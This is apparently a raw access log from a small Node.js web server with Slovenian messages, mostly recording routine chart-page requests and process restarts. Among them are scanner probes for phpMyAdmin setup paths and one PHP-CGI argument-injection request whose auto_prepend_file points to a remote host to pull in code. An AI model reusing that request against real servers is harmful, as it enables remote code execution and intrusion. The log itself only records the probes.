+2017-04-25T12:26:36.731Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:26:37.129Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=389430.19131055
+2017-04-25T12:26:41.375Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=282902.9429838667
+2017-04-25T12:26:44.633Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=635014.7442847212
+2017-04-25T12:26:46.484Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=738009.7380295953
+2017-04-25T12:26:52.431Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=268591.9217666415
+2017-04-25T12:26:59.187Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=638597.6525319121
+2017-04-25T12:27:02.067Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=805082.9845927418
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #2
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T12:30:53.026Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:30:53.794Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:30:54.173Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=733760.9539015293
+2017-04-25T12:33:26.526Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=318978.9470498294
+2017-04-25T12:33:28.855Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=672852.5205656916
+2017-04-25T12:33:33.560Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:33:33.662Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:33:34.015Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=637236.7733173501
+2017-04-25T12:33:36.378Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=364326.21439326904
+2017-04-25T12:33:37.560Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=678407.5554895836
+2017-04-25T12:34:01.072Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=515916.57745360496
+2017-04-25T12:34:02.535Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=535875.8359645752
+2017-04-25T12:34:03.943Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=158681.5020174479
+2017-04-25T12:34:09.161Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=395261.3806970651
+2017-04-25T12:34:10.128Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=293486.5960500534
+2017-04-25T12:38:13.464Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:38:13.563Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:38:13.985Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=942698.1737248517
+2017-04-25T12:38:55.467Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T12:38:55.568Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T12:38:55.967Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=356041.797467209
+2017-04-25T13:01:18.495Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T13:01:18.570Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T13:01:18.986Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=52759.21028339114
+2017-04-25T13:04:07.781Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T13:04:07.887Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T13:04:08.288Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=821194.3820445428
+2017-04-25T13:12:15.003Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T13:12:15.097Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T13:12:15.513Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=124907.9183645574
+2017-04-25T13:12:17.857Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=228999.24119377334
+2017-04-25T13:12:19.059Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=234164.6119588159
+2017-04-25T13:12:20.329Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=176561.6110587096
+2017-04-25T13:17:26.048Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T13:17:26.220Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T13:17:26.558Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=575364.6613275023
+2017-04-25T13:18:27.269Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=813863.9215672987
+2017-04-25T13:18:28.702Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=68413.84129395145
+2017-04-25T13:18:29.666Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=613056.8238714089
+2017-04-25T13:18:30.597Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=181808.54693780013
+2017-04-25T13:18:34.134Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=33298.91441144217
+2017-04-25T13:30:56.665Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T13:30:56.754Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T13:30:57.221Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=692279.5136310118
+2017-04-25T13:30:59.881Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=726395.9861184406
+2017-04-25T13:31:01.801Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=695872.4749611896
+2017-04-25T13:31:06.009Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=480094.73173822224
+2017-04-25T13:31:15.460Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=262327.3701804374
+2017-04-25T13:31:16.558Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=29116.90222458829
+2017-04-25T13:32:19.124Z Incoming Request from: 212.154.77.180 for href: /
+2017-04-25T13:35:48.327Z Incoming Request from: 66.249.93.154 for href: /graf
+2017-04-25T13:35:48.594Z Incoming Request from: 66.249.93.155 for href: /chart.js
+2017-04-25T13:35:49.254Z Incoming Request from: 66.249.93.155 for href: /chart&d&nocache=459041.9643231967
+2017-04-25T13:35:54.889Z Incoming Request from: 66.249.93.154 for href: /chart&t&nocache=863193.7009795571
+2017-04-25T13:35:57.901Z Incoming Request from: 66.249.93.154 for href: /chart&m&nocache=431680.6786028931
+2017-04-25T13:36:02.352Z Incoming Request from: 66.249.93.154 for href: /chart&d&nocache=230706.46914356717
+2017-04-25T13:36:04.769Z Incoming Request from: 66.249.93.154 for href: /chart&t&nocache=163325.58819431718
+2017-04-25T13:36:07.841Z Incoming Request from: 66.249.93.154 for href: /chart&m&nocache=475354.7337108226
+2017-04-25T13:36:50.505Z Incoming Request from: 66.249.93.155 for href: /chart&d&nocache=480060.32454331283
+2017-04-25T13:36:57.394Z Incoming Request from: 66.249.93.155 for href: /chart&t&nocache=758103.636702651
+2017-04-25T13:37:14.161Z Incoming Request from: 66.249.93.154 for href: /chart&d&nocache=689518.5803384809
+2017-04-25T13:37:27.764Z Incoming Request from: 66.249.93.155 for href: /chart&m&nocache=774934.9791225983
+2017-04-25T13:37:31.945Z Incoming Request from: 66.249.93.156 for href: /chart&d&nocache=336882.14348498115
+2017-04-25T13:37:35.148Z Incoming Request from: 66.249.93.154 for href: /chart&t&nocache=266457.52123038145
+2017-04-25T13:37:39.347Z Incoming Request from: 66.249.93.154 for href: /chart&d&nocache=92857.04202549727
+2017-04-25T13:37:42.592Z Incoming Request from: 66.249.93.155 for href: /chart&t&nocache=349063.8160051218
+2017-04-25T13:37:45.032Z Incoming Request from: 66.249.93.154 for href: /chart&m&nocache=626074.9570194993
+2017-04-25T13:38:21.628Z Incoming Request from: 66.249.93.155 for href: /
+2017-04-25T13:38:21.838Z Incoming Request from: 66.249.93.155 for href: /spremeni.js
+2017-04-25T13:38:21.876Z Incoming Request from: 66.249.93.155 for href: /canvas3d.js
+2017-04-25T13:38:22.039Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=707813.7837130318
+2017-04-25T13:38:25.068Z Incoming Request from: 66.249.93.155 for href: /ajaxtle&nocache=552635.8063376804
+2017-04-25T13:38:28.062Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=841774.3444110315
+2017-04-25T13:38:31.071Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=879500.7118609628
+2017-04-25T13:38:34.075Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=251251.25636795786
+2017-04-25T13:43:29.622Z Incoming Request from: 196.52.43.52 for href: /
+2017-04-25T13:53:48.674Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T13:53:48.771Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T13:53:49.223Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=207130.5690193932
+2017-04-25T13:53:59.589Z Incoming Request from: 66.249.93.156 for href: /graf
+2017-04-25T13:53:59.823Z Incoming Request from: 66.249.93.156 for href: /chart.js
+2017-04-25T13:54:00.465Z Incoming Request from: 66.249.93.155 for href: /chart&d&nocache=590187.1335544853
+2017-04-25T13:54:08.741Z Incoming Request from: 66.249.93.155 for href: /chart&t&nocache=351643.68640606216
+2017-04-25T13:54:11.550Z Incoming Request from: 66.249.93.155 for href: /chart&m&nocache=5274.201791320099
+2017-04-25T13:56:34.545Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=87844.49301170571
+2017-04-25T13:56:36.510Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=44075.119789247496
+2017-04-25T13:56:52.818Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=604682.7310245085
+2017-04-25T13:57:01.871Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=353273.12735488545
+2017-04-25T13:57:17.362Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=707558.6315937696
+2017-04-25T13:59:01.046Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=618696.3624542888
+2017-04-25T13:59:09.852Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=378161.0173452958
+2017-04-25T13:59:37.634Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=203059.85846449915
+2017-04-25T13:59:57.863Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=126084.83859443442
+2017-04-25T14:00:06.034Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=332472.8419171645
+2017-04-25T14:00:27.461Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=522724.69429966883
+2017-04-25T14:00:37.693Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=551669.4364822306
+2017-04-25T14:01:22.399Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=789639.6839146595
+2017-04-25T14:01:42.154Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=436458.79012574593
+2017-04-25T15:35:04.484Z Incoming Request from: 212.83.190.237 for href: /robots.txt
+2017-04-25T15:36:03.079Z Incoming Request from: 101.200.79.185 for href: /phpMyAdmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/phpMyAdmin'
+2017-04-25T15:37:24.596Z Incoming Request from: 101.200.79.185 for href: /pma/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/pma'
+2017-04-25T15:38:43.047Z Incoming Request from: 101.200.79.185 for href: /myadmin/scripts/setup.php
+pošiljam 404 Error: ENOENT, open '/root/myadmin'
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T17:13:04.366Z Incoming Request from: 66.249.93.155 for href: /graf
+2017-04-25T17:13:06.807Z Incoming Request from: 66.249.93.154 for href: /chart.js
+2017-04-25T17:13:07.497Z Incoming Request from: 66.249.93.155 for href: /chart&d&nocache=36686.267108233085
+2017-04-25T17:13:07.815Z Incoming Request from: 66.249.93.154 for href: /favicon.ico
+2017-04-25T17:13:15.799Z Incoming Request from: 66.249.93.154 for href: /chart&t&nocache=290913.1513027006
+2017-04-25T17:13:20.963Z Incoming Request from: 66.249.93.156 for href: /chart&m&nocache=970629.063109611
+2017-04-25T17:13:37.837Z Incoming Request from: 66.249.93.154 for href: /
+2017-04-25T17:13:38.027Z Incoming Request from: 66.249.93.155 for href: /canvas3d.js
+2017-04-25T17:13:38.068Z Incoming Request from: 66.249.93.155 for href: /spremeni.js
+2017-04-25T17:13:38.310Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=872510.4668735985
+2017-04-25T17:13:41.300Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=818393.8698212281
+2017-04-25T17:13:44.300Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=624405.0468420774
+2017-04-25T17:13:47.518Z Incoming Request from: 66.249.93.155 for href: /ajaxtle&nocache=442439.2730120619
+2017-04-25T17:13:50.369Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=129895.36826754212
+2017-04-25T17:13:53.312Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=202323.4986719591
+2017-04-25T17:13:56.321Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=244728.60807936892
+2017-04-25T17:13:59.329Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=275219.7064994095
+2017-04-25T17:14:03.044Z Incoming Request from: 66.249.93.155 for href: /ajaxtle&nocache=752113.7943747105
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #1
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T17:29:28.869Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T17:29:29.206Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T17:29:29.639Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=91349.95428211146
+2017-04-25T17:29:32.471Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=91487.44725332291
+2017-04-25T17:29:34.500Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=462404.7843551471
+2017-04-25T17:29:41.490Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=49351.386235745085
+2017-04-25T17:29:42.496Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=94376.15336010618
+2017-04-25T17:29:51.001Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=62351.58451845391
+2017-04-25T17:29:52.265Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=815550.9571764492
+2017-04-25T17:29:53.419Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=953000.5969106654
+2017-04-25T18:02:12.578Z Incoming Request from: 191.96.249.97 for href: /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+pošiljam 404 Error: ENOENT, open '/root/cgi-bin'
+2017-04-25T18:03:25.680Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=135390.16494599855
+2017-04-25T18:03:35.788Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=627173.3416959763
+2017-04-25T18:03:45.092Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:03:45.190Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:03:45.611Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=145499.281627981
+2017-04-25T18:03:48.386Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=229948.8019214311
+2017-04-25T18:04:02.349Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=126203.29464374947
+2017-04-25T18:04:12.695Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=956667.8632047401
+2017-04-25T18:04:23.778Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=301259.9402568741
+2017-04-25T18:04:54.003Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=268368.76822687715
+2017-04-25T18:05:15.284Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=571734.296372687
+2017-04-25T18:05:43.431Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=791444.8402323842
+2017-04-25T18:05:50.503Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:05:50.624Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:05:51.031Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=193814.21132408082
+2017-04-25T18:05:54.182Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=136151.41497706797
+2017-04-25T18:06:45.434Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:06:45.522Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:06:45.901Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=875173.1559154234
+2017-04-25T18:06:48.813Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=320091.28210981406
+2017-04-25T18:06:51.705Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=927896.2026490221
+2017-04-25T18:06:54.055Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=996755.1096518119
+2017-04-25T18:07:03.696Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=15192.753807072857
+2017-04-25T18:20:46.385Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:20:47.369Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:20:48.598Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=636272.2253570128
+2017-04-25T18:24:07.777Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:24:07.858Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:24:08.269Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=853574.0554395266
+2017-04-25T18:25:03.124Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:25:03.207Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:25:03.583Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=899607.8549102125
+2017-04-25T18:25:26.145Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:25:26.255Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:25:26.601Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=895337.6375048687
+2017-04-25T18:25:30.889Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=157570.45687049942
+2017-04-25T18:25:40.075Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=415714.7594954138
+2017-04-25T18:25:42.082Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=91715.33206067517
+2017-04-25T18:25:43.693Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=818363.5667213214
+2017-04-25T18:25:45.125Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=5869.0060095629715
+2017-04-25T18:25:46.625Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=55794.73325283479
+2017-04-25T18:25:49.727Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=516913.4654214851
+2017-04-25T18:30:08.634Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=92259.09333868731
+2017-04-25T18:30:17.202Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:30:17.248Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:30:17.714Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=236052.70614280415
+2017-04-25T18:30:18.057Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T18:30:52.887Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=110786.81917477718
+2017-04-25T18:31:12.298Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:31:12.340Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:31:12.836Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=362997.0558614399
+2017-04-25T18:31:13.104Z Incoming Request from: 93.103.1.23 for href: /favicon.ico
+2017-04-25T18:31:51.695Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=347372.91916004074
+2017-04-25T18:31:55.362Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=582435.2643285593
+2017-04-25T18:32:14.361Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=631303.1141014372
+2017-04-25T18:32:17.343Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=305777.698197601
+2017-04-25T18:32:18.947Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=704467.8937077395
+2017-04-25T18:32:22.949Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=711394.0495097595
+2017-04-25T18:32:41.974Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:32:42.175Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:32:42.472Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=529639.3573549036
+2017-04-25T18:32:45.889Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=976330.9146298382
+2017-04-25T18:32:48.749Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=145755.91191850457
+2017-04-25T18:32:49.842Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=250915.2815248703
+2017-04-25T18:36:23.320Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:36:23.431Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:36:23.811Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=805020.8152052085
+2017-04-25T18:36:27.421Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=143196.42369289222
+2017-04-25T18:36:33.334Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=910838.1807860984
+2017-04-25T18:36:39.422Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=266889.9894000571
+2017-04-25T18:36:49.066Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=912700.5997941319
+2017-04-25T18:37:14.640Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=861475.9186726024
+2017-04-25T18:37:17.348Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=306374.5968507301
+2017-04-25T18:38:03.296Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=650686.699317484
+2017-04-25T18:38:11.863Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=843965.945264253
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #2
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T18:48:10.378Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:48:11.152Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:48:11.522Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=125480.20263897542
+error: Forever detected script was killed by signal: SIGKILL
+error: Script restart attempt #3
+Streznik tece na http://192.168.2.9 oz http://193.77.211.143
+2017-04-25T18:51:03.349Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T18:51:04.123Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T18:51:04.344Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=45012.42352204482
+2017-04-25T18:51:21.764Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=197038.17103926346
+2017-04-25T18:51:23.548Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=273066.95295966166
+2017-04-25T18:51:24.895Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=152161.48901395532
+2017-04-25T19:10:38.197Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T19:10:38.799Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T19:10:39.120Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=423845.366095214
+2017-04-25T19:13:25.047Z Incoming Request from: 93.103.1.23 for href: /graf
+2017-04-25T19:13:25.146Z Incoming Request from: 93.103.1.23 for href: /chart.js
+2017-04-25T19:13:25.504Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=426547.5504255198
+2017-04-25T19:13:48.918Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=197314.9190247563
+2017-04-25T19:13:50.352Z Incoming Request from: 93.103.1.23 for href: /chart&m&nocache=719991.9132893953
+2017-04-25T19:13:53.230Z Incoming Request from: 93.103.1.23 for href: /chart&t&nocache=663553.4920434108
+2017-04-25T19:13:55.616Z Incoming Request from: 93.103.1.23 for href: /chart&d&nocache=159939.06471144425
+2017-04-25T19:17:00.370Z Incoming Request from: 66.249.93.156 for href: /
+2017-04-25T19:17:00.635Z Incoming Request from: 66.249.93.154 for href: /canvas3d.js
+2017-04-25T19:17:00.690Z Incoming Request from: 66.249.93.156 for href: /spremeni.js
+2017-04-25T19:17:01.207Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=255065.68898126637
+2017-04-25T19:17:08.582Z Incoming Request from: 66.249.93.156 for href: /
+2017-04-25T19:17:08.831Z Incoming Request from: 66.249.93.154 for href: /spremeni.js
+2017-04-25T19:17:08.878Z Incoming Request from: 66.249.93.154 for href: /canvas3d.js
+2017-04-25T19:17:09.131Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=788362.4642695155
+2017-04-25T19:17:12.338Z Incoming Request from: 66.249.93.155 for href: /ajaxtle&nocache=940331.39269955
+2017-04-25T19:17:13.244Z Incoming Request from: 66.249.93.154 for href: /graf
+2017-04-25T19:17:13.390Z Incoming Request from: 66.249.93.154 for href: /chart.js
+2017-04-25T19:17:14.137Z Incoming Request from: 66.249.93.156 for href: /chart&d&nocache=363466.3984374582
+2017-04-25T19:17:16.317Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=326244.8558495643
+2017-04-25T19:17:23.095Z Incoming Request from: 66.249.93.156 for href: /chart&t&nocache=144699.96014208088
+2017-04-25T19:17:26.075Z Incoming Request from: 66.249.93.155 for href: /chart&m&nocache=626318.5608921528
+2017-04-25T19:17:29.491Z Incoming Request from: 66.249.93.155 for href: /chart&d&nocache=477464.91323987383
+2017-04-25T19:17:31.824Z Incoming Request from: 66.249.93.155 for href: /chart&t&nocache=933623.4258021219
+2017-04-25T19:17:33.641Z Incoming Request from: 66.249.93.154 for href: /chart&m&nocache=379207.9617431199
+2017-04-25T19:17:36.003Z Incoming Request from: 66.249.93.154 for href: /chart&d&nocache=383824.56343221525
+2017-04-25T19:17:44.032Z Incoming Request from: 66.249.93.156 for href: /chart&t&nocache=361965.07653431874
+2017-04-25T19:17:45.777Z Incoming Request from: 66.249.93.154 for href: /chart&d&nocache=584732.1001336551
+2017-04-25T19:17:50.934Z Incoming Request from: 66.249.93.154 for href: /chart&t&nocache=787183.471744331
+2017-04-25T19:17:52.613Z Incoming Request from: 66.249.93.154 for href: /chart&m&nocache=887964.5998927876
+2017-04-25T19:39:56.441Z Incoming Request from: 66.249.93.156 for href: /
+2017-04-25T19:39:56.657Z Incoming Request from: 66.249.93.156 for href: /canvas3d.js
+2017-04-25T19:39:56.690Z Incoming Request from: 66.249.93.154 for href: /spremeni.js
+2017-04-25T19:39:57.392Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=928500.4016349963
+2017-04-25T19:40:00.418Z Incoming Request from: 66.249.93.154 for href: /ajaxtle&nocache=796221.5352522228
+2017-04-25T19:40:03.409Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=401811.42523079336
+2017-04-25T19:40:06.482Z Incoming Request from: 66.249.93.155 for href: /ajaxtle&nocache=466601.620341863
+2017-04-25T19:40:09.415Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=82748.16240255168
+2017-04-25T19:40:12.428Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=637179.0361475708
+2017-04-25T19:40:15.428Z Incoming Request from: 66.249.93.155 for href: /ajaxtle&nocache=978647.6674587155
+2017-04-25T19:40:18.439Z Incoming Request from: 66.249.93.155 for href: /ajaxtle&nocache=810105.3804259022
+2017-04-25T19:40:21.416Z Incoming Request from: 66.249.93.156 for href: /ajaxtle&nocache=190936.22490073604
+2017-04-25T19:40:24.100Z Incoming Request from: 66.249.93.156 for href: /graf
+2017-04-25T19:40:24.302Z Incoming Request from: 66.249.93.155 for href: /chart.js
+2017-04-25T19:40:24.777Z Incoming Request from: 66.249.93.156 for href: /chart&d&nocache=140741.14320701692
+2017-04-25T19:40:30.009Z Incoming Request from: 66.249.93.154 for href: /chart&t&nocache=368561.9437655823
+2017-04-25T19:40:32.977Z Incoming Request from: 66.249.93.156 for href: /chart&m&nocache=420797.08689535566
+2017-04-25T19:40:37.729Z Incoming Request from: 66.249.93.154 for href: /chart&d&nocache=313087.3167349284
+2017-04-25T19:41:21.515Z Incoming Request from: 66.249.93.154 for href: /chart&t&nocache=749104.3679436926
+2017-04-25T19:41:26.074Z Incoming Request from: 66.249.93.156 for href: /chart&m&nocache=421380.28273312456
+2017-04-25T19:44:38.884Z Incoming Request from: 89.142.55.18 for href: /graf
+2017-04-25T19:44:39.047Z Incoming Request from: 89.142.55.18 for href: /apple-touch-icon-precomposed.png
+pošiljam 404 Error: ENOENT, open '/root/apple-touch-icon-precomposed.png'
+2017-04-25T19:44:39.606Z Incoming Request from: 89.142.55.18 for href: /apple-touch-icon.png
+pošiljam 404 Error: ENOENT, open '/root/apple-touch-icon.png'
+2017-04-25T19:44:39.639Z Incoming Request from: 89.142.55.18 for href: /favicon.ico
